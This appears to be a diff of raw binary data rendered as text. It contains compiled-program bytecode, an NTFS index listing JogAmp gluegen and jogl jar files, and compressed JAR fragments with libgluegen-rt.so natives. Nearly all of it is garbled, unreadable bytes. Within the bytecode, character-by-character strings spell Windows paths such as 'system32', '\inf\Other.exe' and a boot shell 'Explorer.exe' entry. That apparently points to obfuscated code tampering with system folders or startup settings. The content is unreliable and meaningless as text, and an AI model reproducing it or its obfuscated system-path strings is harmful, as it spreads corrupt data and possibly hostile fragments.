+   <lhÿl üXldÿıiTÿı lÿ/hÿ€ J€ Pÿ4lPÿõ   õ    € hÿ4lhÿlÿü"
+  <lhÿl üXlPÿl üX2 hÿPÿlÿü"
+  < à2@  , „ (                      lÿ           hÿ Pÿ õÿ   ltÿPÿ4lPÿ^  qHÿ<lPÿLÿüXlLÿltÿG  lHÿıi8ÿüödÿ2 PÿLÿdÿü"ltÿCPÿPÿM8ÿ@(ÿ
+  lPÿltÿG  (ÿüöTÿ/PÿTÿü1xÿû”à2@  T t <            "        xÿ dÿ Tÿ tÿ   ÿ û”          Pÿ Lÿ (ÿ   Kÿÿ OlÿH   lÿ`#@ÿHÿhÿH $  >hÿFXÿ < $    Hÿ`#Dÿûû2 Dÿ@ÿ6 XÿHÿlÿ $hÿH $  >hÿFlÿ < $  (  5lÿ ;<ÿH ,  l<ÿY8ÿı“@hÿH $  >hÿıÇDÿı“@ ÿ    /Dÿ  ¸8@  d ¸ $                       $          hÿ Dÿ @ÿ lÿ Xÿ Hÿ KAõ    ¬ Mlÿ@
+  tdÿ ‰° ô­^ÿ!`ÿ`ÿØ   k^ÿÆ`ÿ” ^ÿ T Mlÿ@ k^ÿôÿÆ€  T Mlÿ@
+   ŠT  ŠX 
+  ‘  ŠT  ŠX 
+  A ‰° ô© ° Xÿ ‰° !`ÿ`ÿè   lXÿ ı‘¨ /Xÿ`ÿXÿ ‰° ô©!`ÿ`ÿè   lXÿ ı‘¬ /Xÿ`ÿ^ÿ ¬ Mlÿ@ k^ÿô Æ> ¨ ı“@ ¬ ı“@!$`ÿ`ÿş   ` `ÿA   T;@  4 D$                                 Xÿ `ÿ K< T ^   X ^  Ì X ^  õ    ÌÄ T ^  õ    Ç X ^  õ    ÌÄÅ<   ôÿÆ< ŠX ôôÿş] ô  Ã¡ ôlÿü¿'\ÿ%lÿışXÿ!TÿTÿì  /XÿTÿl ôı=Bÿ!TÿTÿØ   kBÿô ËTÿ<Xÿô !TÿTÿè   lXÿ ı‘¨ /XÿTÿXÿô!TÿTÿè   lXÿ ı‘¬ /XÿTÿ ¨ ı“@ ¬ ı“@!$TÿTÿş   ` Tÿô  °  >\T;@  L @,                      Dÿ lÿ           Xÿ Tÿ   Kÿÿ Atÿxÿ $  	 xÿX 
+ >tÿFdÿTÿ
+  Tÿ:Dÿ  ]û3xÿ6 dÿTÿ? 2ÿ \ MDÿ@ k2ÿôÿÆ=  Š\ ôôÿş]  ô  Ã²  ô ¤ üÀ 'Dÿ% Š¤ !üxÿxÿì  xÿ v  ôı=  2ÿ!üxÿxÿØ   k2ÿôÆxÿ; .tÿô !üxÿxÿè   >tÿıÇ,ÿdÿ
+5  /,ÿxÿ5dÿ .tÿô!üxÿxÿè   >tÿıÇ,ÿdÿ
+%  /,ÿxÿ5dÿ 
+9        T;@  P D$                       $          tÿ ,ÿ xÿ dÿ Tÿ 4ÿ   Kÿÿ #õ      `ÿ4l`ÿ^  q\ÿ<l\ÿqhÿ/`ÿ lhÿõ    Ç>  ı•    
+    #õ      `ÿ4l`ÿ^  q\ÿ<l\ÿqhÿ/`ÿ +õ     `ÿ4l`ÿõ    lhÿ^  q\ÿ<l\ÿqdÿ/`ÿ ldÿõ    ÇB   
+    #õ      `ÿ4l`ÿ^  q\ÿ<l\ÿqhÿ/`ÿ +õ     `ÿ4l`ÿõ    lhÿ^  q\ÿ<l\ÿqdÿ/`ÿ *€ `ÿ4l`ÿõ    õ   ldÿ
+  <l`ÿl üX/`ÿ ldÿõ    Ç§   
+    #õ      `ÿ4l`ÿ^  q\ÿ<l\ÿqhÿ/`ÿ +õ     `ÿ4l`ÿõ    lhÿ^  q\ÿ<l\ÿqdÿ/`ÿ õ    õ   õ   ldÿ
+  < ldÿõ    Ç6  ı• ùõ\¬4@    ¼(                     lÿ           `ÿ   Kÿÿ Atÿxÿ $  	 xÿX 
+ >tÿFdÿTÿ
+  Tÿ:Dÿ  ]û3xÿ6 dÿTÿ´ ! xÿxÿè  xÿ    ôÿÆ² .ÿ \ MDÿ@ k.ÿô Æµ  + @ ı“@ \ ı“@!(xÿxÿş   ` xÿ°   Š\ ôôÿş]  ô  Ãı  	ô0ÿüÀ 'Dÿ%l0ÿ! xÿxÿì  xÿ Ç  ôı=  .ÿ!üxÿxÿØ   k.ÿôÆxÿq ôÿ!xÿxÿ\ 7 xÿ 8tÿô! xÿxÿè   ltÿ
+8  è!ÿÿd 7 /tÿ) xÿÿ   \ MDÿ@
+   + @ ı“@ \ ı“@!(xÿxÿş   ` xÿ     ùüøT;@  d ¼(                      0ÿ $          tÿ xÿ ÿ dÿ Tÿ 4ÿ õ      `ÿ4l`ÿ^  q\ÿ<l\ÿqxÿ/`ÿõ     `ÿ4l`ÿõ    lxÿ^  q\ÿ<l\ÿqtÿ/`ÿõ    õ    õ  ltÿ
+  <õ    õ    õ  ltÿ
+  <ltÿõ    Ç‡ şÄ<ÿš™™™™™¹?
+  5<ÿ
+   õ     `ÿ4l`ÿ^  q\ÿ<l\ÿqpÿ/`ÿõ     `ÿ4l`ÿ^  q\ÿ<l\ÿqlÿ/`ÿõ    	 `ÿ4l`ÿõ    llÿ^  q\ÿ<l\ÿqhÿ/`ÿ€ `ÿ4l`ÿõ    õ   lhÿ
+  <l`ÿl üX/`ÿlhÿõ    Ç› şÄ<ÿš™™™™™¹?
+  5<ÿ
+   õ     `ÿ4l`ÿ^  q\ÿ<l\ÿqpÿ/`ÿõ     `ÿ4l`ÿ^  q\ÿ<l\ÿqlÿ/`ÿõ    
+ `ÿ4l`ÿõ    llÿ^  q\ÿ<l\ÿqdÿ/`ÿõ    
+ `ÿ4l`ÿldÿllÿ^  q\ÿ<l\ÿINDX( 	 ¾>+            (   8   è         r U ÑA Ña                       ¬:     Üwª‡ZÑ TĞ,jÑ-*xª‡ZÑÜwª‡ZÑ P     F             G L 0 2 F 3 ~ 1 . J A R - s r               ¬:     Ñõtª‡ZÑ TĞ,jÑâuª‡ZÑÑõtª‡ZÑ        ™              #g l u e g e n - r t - n a t i v e s - w i n d o w s - i 5 8 6 . j a r                       ™              #g l u e g e n - r t - n a t i v e s - w i n d o w s - i 5 8 6 . j a r               ˜ ˆ     ¬:     Ñõtª‡ZÑ TĞ,jÑâuª‡ZÑÑõtª‡ZÑ       ™              #g l u e g e n - r t - n a t i v e s - w i n d o w s - i 5 8 6 . j a r                       ™              #g l u e g e n - r t - n a t i v e s - w i n d o w s - i 5 8 6 . j a r               ˜ ˆ     ¬:     Ñõtª‡ZÑ TĞ,jÑâuª‡ZÑÑõtª‡ZÑ        ™              #g l u e g e n - r t - n a t i v e s - w i n d o w s - i 5 8 6 . j a r               ¬:     Ñõtª‡ZÑ TĞ,jÑâuª‡ZÑÑõtª‡ZÑ        ™              #g l u e g e n - r t - n a t i v e s - w i n d o w s - i 5 8 6 . j a                ˜ ˆ     ¬:     Ñõtª‡ZÑ TĞ,jÑâuª‡ZÑÑõtª‡ZÑ        ™              #g l u e g e n - r t - n a t i v e s - w i n d o w s - i 5 8 6 . j a r               ¬:     Üwª‡ZÑ TĞ,jÑ-*xª‡ZÑÜwª‡ZÑ P     F             g l u e g e n - r t . j a r                 o w s - i 5 8 6 . j a r ¶:     p ^     ¬:     Üwª‡ZÑ TĞ,jÑ-*xª‡ZÑÜwª‡ZÑ P     F             g l u e g e n - r t . j a r                 ¬:     ğdª‡ZÑ TĞ,jÑŠ(fª‡ZÑğdª‡ZÑ        5              G L  E G E ~ 1 . J A R                     °:     p Z     ¬:     ğdª‡ZÑ TĞ,jÑŠ(fª‡ZÑğdª‡ZÑ        5              G L U E G E ~ 1 . J A R                     ¬:     9êTª‡ZÑ Õ7£¨ĞÎIVª‡ZÑ9êTª‡ZÑ °=     ï =             G L U E G E ~ 1 . Z I P                     9êTª‡ZÑ Õ7£¨ĞÎIVª‡ZÑ9êTª‡ZÑ °=     ï =             G L U E G E ~ 1 . Z I P                     9êTª‡ZÑ Õ7£¨ĞÎIVª‡ZÑ9êTª‡ZÑ °=     ï =             G L U E G E ~ 1 . Z I P                     ¬:     æ\iª‡ZÑ TĞ,j öƒiª‡ZÑæ\iª‡ZÑ       ê              G L U E G E ~ 2 . J A R       ²:     p Z     ¬:     Îkª‡ZÑ TĞ,jÑïÍkª‡ZÑÎkª‡ZÑ        "              G L U E G E ~ 3 . J A R       ³:     p Z     ¬:     nª‡ZÑ TĞ,jÑ:Ûnª‡ZÑnª‡ZÑ        Ô              G L U E G E ~ 4 . J A R       ¼:     p Z     ¬:     ùè”«‡ZÑ TĞ,jÑKu¬‡ZÑùè”«‡ZÑ @     %2             J O 9 B A 4 ~ 1 . J A R i v e »:     p Z     ¬:     Áˆıª‡ZÑ TĞ,jÑâÖıª‡ZÑÁˆıª‡ZÑ °     Q¬             J O A D A 2 ~ 1 . J  R i v e ·:     ˜ ‚     ¬:     —|ª‡ZÑ TĞ,jÑ@}ª‡ZÑ—|ª‡ZÑ p     
+k              j o g l - a l l - n a t i v e s - l i n u x - a m d 6 4 . j a r       ¸:     ˜ †     ¬:     Íµ€ª‡ZÑ TĞ,jÑïª‡ZÑÍµ€ª‡ZÑ      ôƒ             "j o g l - a l l - n a t i v e s - l i n u x - a r m v 6 h f . j a r   ¹:      €     ¬:     |­„ª‡ZÑ TĞ,jÑû„ª‡ZÑ|­„ª‡ZÑ `     ºP             j o g l - a l l - n a t i v e s - l i n u x - i 5 8 6 . j a r º:       Œ     ¬:     }1øª‡ZÑ TĞ,jÑøª‡ZÑ}1øª‡Z  Ğ     äÅ             %j o g l - a l l - n a t i v e s - m a c o s x - u n i v e r s a l . j a r ‡ZÑ»:     ˜ †     ¬:     Áˆıª‡ZÑ TĞ,jÑâÖıª‡ZÑÁˆıª‡ZÑ °     Q¬             "j o g l - a l l - n a t i v e s - w i n d o w s - a m d 6 4 . j a r Ñ¼:     ˜ „     ¬:     ùè”«‡ZÑ TĞ,jÑKu¬‡ZÑùè”«‡ZÑ @     %2             !j o g l - a l l - n a t i v e s - w i n d o w s - i 5 8 6 . j a r jÑ½:     p Z     ¬:     ·Ğ¬‡ZÑ TĞ,jÑúl¬‡ZÑ·Ğ¬‡ZÑ  4     °4             j o g l - a l l . j  r       ·:     p Z     ¬:     —|ª‡ZÑ TĞ,jÑ@}ª‡ZÑ—|ª‡ZÑ p     
+k             J O G L - A ~ 1 . J A R       ¸:     p Z     ¬:     Íµ€ª‡ZÑ TĞ,jÑïª‡ZÑÍµ€ª‡ZÑ      ôƒ             J O G L - A ~ 2 . J A R       ¹:     p Z     ¬:     |­„ª‡ZÑ TĞ,jÑû„ª‡ZÑ|­„ª‡ZÑ `     ºP             J O G L - A ~ 3 . J A R       º:     p Z     ¬:     }1øª‡ZÑ TĞ,jÑøª‡ZÑ}1øª‡ZÑ Ğ     äÅ             J O G L - A ~ 4 . J A R                                                            PK
+   À2IGŸìP}  ô     META-INF/MANIFEST.MF’IOÃ0…ï‘ò|$»v ´É­E¨*b®Èq¦©‘7ÙË¿ÇeK!8ú½ofí¹àF®!D|>Hk*ÄÍ³™ÙQf‹ ¤%³$GyvâGhğüuËO	}8¦¸.&hïÊs¡ Xï¬ç1Õï§nÎ))ŞOø’k¨ĞBu° ƒn:ƒWRCİ:rıE­dT;Øâh.M#MPR õ¶şwÕwâ‚=ÓX_¡3ÛÎ´KµîŒŒ¯y¶ÔNÿİ'üÅí#ÅÀwR5ï&®KJqAÙ˜QZAÏØTÈzÙJ3Ò<Dğj›WÆ
+	Á ¬Åq9­'kÆh9IcG´˜Àøl<.ÖÅ”ş÷Ÿ÷ÿ ñ2…V“GÛríÔİÍy…61ºj4ú@ˆõí(ÏN_"˜Ğÿô§iRÙDŞ’ÔT[“g+ß…íËÚsŸ)ú.½ò5x-Ã¶A¨W
+»^ø¹IŸ…x¦”}æµ‚ôHÔ<¤©iGûéæY½PK
+   Á2IG‚"3€   œ   /   jogamp/nativetag/common/linux/armv6hf/TAG.class;õo×>#..fvvvNF6›Ì¼Ì;FfÍ0Fçü”TVFÍ¬üôÄÜı¼Ä’Ì²Ô’ÄtıäüÜÜü<ıœÌ¼Ò
+ıÄ¢Ü2³Œ4ıGwF¬Ä²DıœÄ¼t}ÿ¤¬ÔäC& = À„@$'æ30°jmg`ÜVÀ  PK
+   Á2IG¼ŞÆ  „#  &   natives/linux-armv6hf/libgluegen-rt.soíZMlÇ%)––˜xmË	m©òZQÚ$–h:¡=Är%¶¥8ñOÛƒQbE.¥uÈ]uweH…‹ºhQu
+ÇvPˆ±¨AÒCzIj!r\À@í¡RÊR nkAQTıwVmW²)h
+è3³ï½ï½y;;3ËÙï?32,Ió)ÊcÔI2ÖòÜnÆ"Œµô3…Å!{€%Y]Û£·{ÜBó¬&yxÖã«Ìã8—Gòiæ1Écà]'ÏBÈ—‡<Ìdäûüö˜fğk:‚{Áƒ6zäÑfp
+üŞîLïàu…—ò²;àæËàvğÜ—O]`¼Ç…¡ìK\öxwhĞ^¾Â¨u•ëÔGºmŒçœÓ^FW±#JõmàMà­à‡Á€¿
+îïw¬‚1’ôıÄÙ·áì®ìõw+Ú=ÊÅ¥•í ğ^8>Çõ¿÷Æ–'ÿëÒuÈ¯" W¹üW÷”ëòğwSğ÷’ñî–zû€¾Œäö
+ú¹€¿oâ½ÂMI~í?£¿ßâö“ˆ¯ñMğ¶ÿ,ùí·ş]Ä;$Äw#àoğ’[ëò¿åàëÀàòOZVÊ/üõ!EÁß¯òŸ!ç„|ìüMÜ$ïïK°M°_Dûc¡}ö'ûŸğ§í§€{ms=şhÿqsİşÈO§€ÿÊs‚ü÷ğwMğ÷½ø›Ø‡(OãAUxü¿EôÙõ¬š=c«¥ÉlÎ,•L#{æl){ä£§½˜ÕİÑÕ¢ş]-LÓ´³§}zhÆPKznD7^Ò¬Ã¥Éb6_ÌM»QÍ²L«AsR34±gJ«XŒª¹	İĞ†TG=lÌãS†£—´ì¸æ¼`ê†£Y'ˆÃÆ¡G³	¬qu\bØ3vÎ4
+cõq£¤ÎaÃXW4"Â¾MCì²iˆıMC40bãÍ!ğ‘ÒÈpÑT›ìÉ95VÔšÏF84ÒÖ{O<ëußÏ|ı‰ôì›î}X
+a 2t3ËÎ¡©BA³`H·´œãµóyK³íµ0ÌEÕ)˜V)››²,Ü¿“eT/u›3yu¦a„œeÚ«MÑ2qDµjËEAŸ~^uô³Úˆ>6è8–>f³lV›ÖóÓYÛQ-g¹¥yÔóH›/Ğ¨kc¶½¬»\ÏfyvµºW²$Öº‡°FÊTb-n§ë]ŠJìc:©ÄæM¡ØX¥ÏUfİ++‰;¿qÙkX?¼8¿é£WæÙİw]¿şÙßëõ;Bı¶P¯õ?Pı¹¾Obïüt>ukt^fmn»Üæ¦”6—eÊ‰ê™—±Xu[eªg®¸?ßÅ•Y‡›’;ÜıK{«	Ø%¸ì¢R¦¼ÍÎüåOQV®Æng/¿w;ÌÏ¿v­vÂôn--}êã„ÙÉ‚İA—|J´µE¼ˆqÑñê“^Œ	#äUWn¸ÀM«¸
+úİ“ñú.£T8>ŞZı:öÿ­)îã|¤àCÜ¬òC1Ê\ï;}İƒW\¿Êxv?Rfİˆr±‘ËU?FºE»˜™u£™‹•¨R®ö“øµ¸¨ĞéÏ#í¬g\ˆíM!6YñrĞº¼÷Ÿ*W#ÈùI 2òQ1qX^îv­ú9‰e^_Î‰_ËIL~}]9yuœL¯’lu{hÜà:ùñû6ÈóãÇ–Šó~òs{ôN ÄŞésò“D~h&eÂ//ĞØb·.Ì³Ä{·»(6>n‚^C¬ˆ	~5èÇ—aøR~˜^ä>õÂâÓK|Îxÿ+½ûíÇ½¿ÍôCœG}=Y©?—­x6ÂüÀ³!‹s§0f1ß.úÏ^pü†Í×ÉÌÑùZ<ry!ûï¥O“ÂsöÏ]å…KQV!Ù¥ˆT‘æÎWèÚeé)óJ¥ö"®^Ì—?x¿rè‘rõznær•$Ç`Êeèş²Œåw£cò½âùz ƒò¬Œ§×VÄ3×áŞË÷ÁC›CçRE©¯/T¶ëÌnaéj`Ùv9ÕYcN=œS¶"‹÷½¦Ô×ım˜§¢şºïÏ›ı,Äg°Û[Tñ½Ç¦œc…Q­dZ3ÏÔŞÙ°ªµ¼â˜
+6|Ê©“Ã}JnBµl»:EµÆ§h_¯t£–éVtC1jÛ5%¯Û“ª“›Ğ¬šb·÷bİİŞ¾µñğÖİıùÄ^À+½¶–3¨gµiĞà“´A´A´A´AôÅ :³½Ëøz‹wn{0âñŞˆ{g¹tW;»-{gÂæ3Ó¹.ÏÎµ5î—ÎÏ}ºÓÎìÙ§Ÿşšòı	j;¦Yì{şYe_zß@:ó¸ÒŸ>Şÿ¤1Híª¦éLR(ÕX<¶ÆÚ¥íÒÃÑ”´CÚéˆvJ]q–¶'lÇrÔ1–Pí	–ÎÏtvV+‹¥-­˜,:,íhÓøµÌÚ?¸$¦37–7q•ş&Æ¶¥¦ÕÚÂSf7pÚø¸ˆğ1B<"Õ¿ˆqŞÂué:â¹ˆ7f"\‡Æ}Çà_«·xcÌ'ÿH¾GØÄõhlgx»…ãÑ÷r›¸0†Nñûñ=!èÑ™xí\<±R(ÃõÈÏõv3Òëp,êKí[]Şw QAà9ÿìĞâ·~|ÃBß‰z wShû²cÖ¤ıâÃõ–}rê@B³!zÿPK
+   À2IGŸìP}  ô             ¤    META-INF/MANIFEST.MFPK
+   Á2IG‚"3€   œ   /           ¤¯  jogamp/nativetag/common/linux/armv6hf/TAG.classPK
+   Á2IG¼ŞÆ  „#  &           ¤Œ  natives/linux-armv6hf/libgluegen-rt.soPK      ó   á
+                          ôùõt   äù
+  äùû”Ôùõe   Äù
+  Äùû”´ùõm   ¤ù
+  ¤ùû””ùõ3   |ù
+  |ùû”lùõ2   \ù
+  \ùû”Lùõ\   <ù
+  <ùû”,ùõP   ù
+  ùû”ùõe   üø
+  üøû”ìøõn   Üø
+  Üøû”Ìøõx   ¼ø
+  ¼øû”¬øõ.   œø
+  œøû”Œøõd   |ø
+  |øû”løõa   \ø
+  \øû”Løõt   <ø
+  <øû”,øûïø`#\ú ı‘X /\ú6J lø\øLø<øø,øøÌûLú4ú$úúúôùäùÔùÄù´ù¤ù”ù|ùlù\ùLù<ù,ùùùüøìøÜøÌø¼ø¬øœøŒø|ø    #\ú *#Dú ı‘\ 2 \úDú   Fœøõ\   Ìû
+  Ìûõi   Lú
+  Lúû”4úõn   $ú
+  $úû”úõf   ú
+  úû”ôùõ\   äù
+  äùû”ÔùõO   Äù
+  Äùû”´ùõt   ¤ù
+  ¤ùû””ùõh   |ù
+  |ùû”lùõe   \ù
+  \ùû”Lùõr   <ù
+  <ùû”,ùõ.   ù
+  ùû”ùõe   üø
+  üøû”ìøõx   Üø
+  Üøû”Ìøõe   ¼ø
+  ¼øû”¬øûïŒø`#\ú ı‘` /\ú6: ÌûLú4ú$úúúôùäùÔùÄù´ù¤ù”ù|ùlù\ùLù<ù,ùùùüøìøÜøÌø¼øœø¬øŒø   FÜ÷õ\   Ìû
+  Ìûõs   Lú
+  Lúû”4úõy   $ú
+  $úû”úõs   ú
+  úû”ôùõt   äù
+  äùû”Ôùõe   Äù
+  Äùû”´ùõm   ¤ù
+  ¤ùû””ùõ3   |ù
+  |ùû”lùõ2   \ù
+  \ùû”Lùõ\   <ù
+  <ùû”,ùõW   ù
+  ùû”ùõi   üø
+  üøû”ìøõn   PK
+   ¶2IGŸìP}  ô     META-INF/MANIFEST.MF’IOÃ0…ï‘ò|$»v ´É­E¨*b®Èq¦©‘7ÙË¿ÇeK!8ú½ofí¹àF®!D|>Hk*ÄÍ³™ÙQf‹ ¤%³$GyvâGhğüuËO	}8¦¸.&hïÊs¡ Xï¬ç1Õï§nÎ))ŞOø’k¨ĞBu° ƒn:ƒWRCİ:rıE­dT;Øâh.M#MPR õ¶şwÕwâ‚=ÓX_¡3ÛÎ´KµîŒŒ¯y¶ÔNÿİ'üÅí#ÅÀwR5ï&®KJqAÙ˜QZAÏØTÈzÙJ3Ò<Dğj›WÆ
+	Á ¬Åq9­'kÆh9IcG´˜Àøl<.ÖÅ”ş÷Ÿ÷ÿ ñ2…V“GÛríÔİÍy…61ºj4ú@ˆõí(ÏN_"˜Ğÿô§iRÙDŞ’ÔT[“g+ß…íËÚsŸ)ú.½ò5x-Ã¶A¨W
+»^ø¹IŸ…x¦”}æµ‚ôHÔ<¤©iGûéæY½PK
+   ·2IGÈŸ   ™   ,   jogamp/nativetag/common/linux/i586/TAG.class;õo×>#..fvvvNF6›Ì¼Ì;FfÍ0Fçü”TVFµ¬üôÄÜı¼Ä’Ì²Ô’ÄtıäüÜÜü<ıœÌ¼Ò
+ıLS3ıGwF¬Ä²DıœÄ¼t}ÿ¤¬ÔäC& % À„@Ó€$'æ30°jmg`ÜVÀ  PK
+   ·2IG$0éX  À  #   natives/linux-i586/libgluegen-rt.so½Ypåÿ.9Â!AHB„kDåïşÈ€0B.L$´çæn/·ár›îíÅ„6ö ¹9âÄb+(Sl¡ÕÎ8Nf´-¥TÁ¨€R@E«ÓÆñq„ö”€‘ëï}»—lp6¤ÓMŞ½}û~ï}ï}vß·û#{I‘Édbñ#$5`lxËxíúfeil2ËaÙ¬­Ù!!“q=¿6E£|\˜JÓõ)`Û ß6E£v¦éÍ:E4I§¸®ìSÕÕ>6:fÅõßƒõs¤iÍsÌ+cKï«`ëœ“~=#·>Ñrïƒ¿š¶{té ‹NÌbb¦­™ì¬µğáƒéˆç²t+™ÙÓ£
+¦OË ,ºŒÓÛÌQNYAßİ¢ç?nMJ±¯?{ò‹ŒÏÍšÖöÄÑwİS£ß/šğÌœ?4]ÈøøÔÜ/«×µ¦~ğƒrG½}</ÚP4}ÿ?²ašõÅñ'£­)ö÷:K6n]¸köôíCó/¬zBèÎ/:×væ—Œ{¤êß/î™İ_ò³WRw¯ødÛ¦Ÿ>öTt{ıÙg¢ÛË=ñÌ…Ë%öÕlÃ SŸåt”Çš´^ùFĞES_ùmìËrc}æù‹%àİ	í	øy	ònL¾¿aĞ†óöo`cÁwÇ“Î†c°×ô' ï0ÈbR¼`×Âß»™bhKûÆš`ÿ¸A?ı‘‹Ä%]@n™;ŒI_kÀŸ†ÿÈ(m‘şe~ğn> şF†–7ÉŸôñ?–E­Çä{G×ÿù4Øïş¯ˆïU]¾	ú_ôwÁş$ù‘./Fû«ú_ ÿ;ƒ<ñ¿e«á3üWèrşÊú“àw">».{¡¿Å ¿ı¹É ¿ıÈ·ÆãÿÆ?s8ªjdŸÃ¯
+Šêp0‡ä“Tæpƒ1GñŠR‡KTÄ*É¯ŠÊŠÒ%^Ù'®*½¢¦ë_ãpÖä@ğJë!.«s”ë¸%^Áïıl™P'8ªå*¡¦Öá”k¨ıêºÇ²•¥ªäå!Hšu?HÙï¨ğIõ…>¡Fr–H¾u¢R\Sëu¸¼N¯ì¨¨(²2@¹VôĞÄßPs‹RÁé‘|b¡ 
+Å>·\ğ©Rè¨Õ2Yò¡×îGGû
+TÑOÎîF¨}øüNÙç°¯Å^©ÊW#úÔbŸ:ïº¢1z˜9wĞ.fÏ´‹¹síbpJd_Õà<è3epNŠ¼²0ÈL
+å nƒïAø¡™¾Ü}½c¢Y_÷€hæ×ß‘šı ³ï¯aàÈ'É}âÜnQ!…’":UM^ìr)¢ßŸÌ‚)ó
+ª[VjÎ€¢`üV ”RÉë•üş(0ÙíìÁ©Èşkè1±LPøãÂ-Õß'¨RX"U.VUEªô3¯Té´ùeÛ\æ]è&<•*ı~í)‡K>[ZR\°Ä1Ë6Ó6»ç<?^	¥ğÚ:ÕP™õGö)ìTšVƒÑáŸ(£.é×2%iµ;d¨¦§zŸêåM:aªÆ½àiT‡­J6õÄñĞß@õmàTË4G"OGí±ƒ8j]Äaÿ,qØï%'ÈîvZ"¿Gƒ¶>w3cá`4‹m>¨‰(¸|İòP+3±—h7Ûc‰Ë{¨ÈóĞiG;Lc{(K©;Ú¸L;]ì8Èå,’é§£…ËT){¨$íx–Ëtê¡ò¾£™ËTù{hÄ:¹L*•5µÃ¹“ZİÍ½¡Oï|Å£­§à9ØinÚNÆMÁÙøÒìJ«vjYv¦—ÇÚ‚¯g†×tmmªcÜş9nÿT_û|n¨+%tèPÇDÓ‘ã]ê˜p¸›U‡£ËÊcÇãB_5¸:…û[Åı-Õü5ş‘O¿Àíáày-ŠQˆ"öÒt\Œ|~%ƒÈĞ¼É›4õão(÷wq¼_ĞBı¹ùDàFÂvÌ‡Øƒoï¢FN¨§ÑHYìœŸûN‚Y‡í´YdÁ™LÍÛ-anÜ‘J>-±@f,`á²Gƒ£läOm¥Æƒ“"]¡öAûa; íaû˜ıtØŞNmD²µ`Æ?E¯Ù‰,çvwÃ.2	§ºëÀĞ}Ç¹l=†])zÑxq'+á%32Œ{¹„¢1ƒş[¥ûØË}˜«ÙÕ™–h˜Úy_”…Æ0È±Xyô5Ş±%¸VÆ/¾‹<Êı<Ô»x|cbäën=Ûó}:òy- DOaûùMb×Ck×Ä³±F|CÙLËéÛ—=™eñÌ²úÍ,ëú3Ûu­ÌğQ¤Î/‹4RËê?µ¬şSÛG7‰5ú¸›#«ºùüÏ&»ôê	‘Ï¾æwÆÇuŸ)ß—Òsfş¿YzÎÒãgè†oY;Ïïí:É*ÔÜˆûkJxe7¨fMöö²È?.ó¤Ñ¿;¥Eàkİfºğ
+]<z3tªÉ<?t8\zzÿÉÒÊÌĞ‘‹g]N9Ô5qÊk¡¶¦ó£.7‰Ñ‡Ö:Öúæ25ôù8cCÆ†ŒÔ¢³‹gLÇCo¡Ğ;¡¿ŠMLpª­¯ßpŸ;Çõ¬¯Ãöó=ËÌÃ+ÿ‹eöİ~'cg?“ÑröªÉxnÊ·¯¦àÆólä“õYÇôgÙ¹KıGcõ‡W5
+‹;¼‚¯êåu¹»T¬‘•;ß²"AòŠ.«*[QÀX+VÍ˜guzÅoE•b”ª Õ©Ö<œåçY%ŸÕÇË«Kò×
+ªÓ#*˜§móâofrØEæ1ö¿ˆİ-ª˜¬1^ëÄzÏ4>uA;ÓŞÁYñèèÿ]jÅ½cx¸üiğ­àÌöğ%Xæ€—‚w+à¹¹àÁ·€¯§ûÊğ§Áéf¿ü ø‹àƒïïì±<‘=øûdŞNöàgÉ<JöàWÈÜ‚[j7øBğ\,ñ_ß~\5kï2y­·¾œ™6XLãÓÍfÊƒ*ªFr/ÆbÍÈ°e¤/yƒj®gwç,˜:kRéş„¾áïÔgX6§Œ¢¾/š‡Aï%êƒ©µo´ö`6QŒ=³QÇPÕó<h8úş#Æ¾%5hNim]üæbj‘pm à>º×ÇQÜ] 'Æl¸WÔwô·&Ä´F‰|,æ¾kø ıjèç%Ño€>/‰~ôéIô ÿêÒµõCßDßı[Iô4__N¢§yüó$zšß[“èiŞ+Iô´V'ÑÓ:)J–?ôùÉò‡>'YşX7fèçõµš*oZ‡YĞK}ìKİbIYM³í0Ÿo¼J¶ØŠş°÷ôbi?	ì}õê9ür|“ª1ùeèëD{-zbÓ»fú@ï°³™¶¯¢{Ñ7Ú_åêò—Wb2ÍuúşB% ½š·¤hïRGb„mß«Ñ¾°qªöı…Ö<İ7è;}«hN×ÎËÒµ÷÷¤§×çTG >•­¸Â[¦QæËGàÓZ6î5¯ç ï?ñc,¾4TZ	rƒê@[Fh{É¥K–Üe\(VJ‚Ï:Ç6ß6kÆÌü)Úc6¿Ç¯*ªPÉl>YmU¾€­2 y]3$ã’Gğ{˜ÍÕà£›œ«Š¦©¿$ûúèÑK8í¤Ö«2ÕlSÅzüòÎ6Eæ›u›èq¸< —Ò+iAQ„Í"~^íTxôÚË*ÿÑZÑ<b÷Ïlôö O¿ô+9mÉi¬ßÑâ‡Yç@_a	Gsˆˆª£Th²î“p4·ˆZR4IÇĞË×m	Gs‘häĞŞvãŸuèYÓÛ¥¹D´ÒĞnŠNô<¹¢ãhå³¾íÒ±4L·¡9L´(!^ë¸¦Íùfn¸çÖıÓZ¢µHtK?ı'p|Á‚š¸ø÷F¯GßV‰†¥õÅÑ¡p´ö‰ÆüÅÛ­×q”oËhl¦«qœñ{i"îqîõ›4:z5n(Cï/ş}7»WgÄíeÚ·PÂÑ½jÓ5p-z»„Û
+ÜÖkà~«÷	áøwãlí›±Ù€£q{ÅàŞ9ys®î?¢Vî‰ÀMïwÌ€£ûÏ9ıÇwBoŸpô]®%šSúyü•ánNÀÅÉxoıs–o¢¿ÿ PK
+   ¶2IGŸìP}  ô             ¤    META-INF/MANIFEST.MFPK
+   ·2IGÈŸ   ™   ,           ¤¯  jogamp/nativetag/common/linux/i586/TAG.classPK
+   ·2IG$0éX  À  #           ¤†  natives/linux-i586/libgluegen-rt.soPK      í                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
+  \øû”Løõi   <ø
+  <øû”,øûïø`ıÇù ` |ùlùû”\ùLùû”<ù,ùû”ù`ıÇDúÌûLúû”4ú$úû”úúû”ôùäùû”ÔùÄùû”´ù¤ùû””ù`ıÇ\ú
+  2 \úDúù6J Lø<øø,ø”ùùøÌûLú4ú$úúúôùäùÔùÄù´ù¤ù|ùlù\ùLù<ù,ùùüøìøÜøÌø¼ø¬øœøŒø|ølø\øõb   Ìû
+  õo   Lú
+  õo   $ú
+  õt   ú
+  õs   äù
+  õh   Ôù
+  õe   ´ù
+  õl   ”ù
+  õl   lù
+  õE   Lù
+  õx   <ù
+  õp   ù
+  õl   üø
+  õo   Üø
+  õr   ¼ø
+  õe   œø
+  õr   |ø
+  õ.   \ø
+  õe   <ø
+  õx   ø
+  õe   ü÷
+  õ    Ü÷
+     F\öõ/   ¬÷
+  ¬÷õs   œ÷
+  œ÷û”Œ÷õy   |÷
+  |÷û”l÷õs   \÷
+  \÷û”L÷õt   <÷
+  <÷û”,÷õe   ÷
+  ÷û”÷õm   üö
+  üöû”ìöõ.   Üö
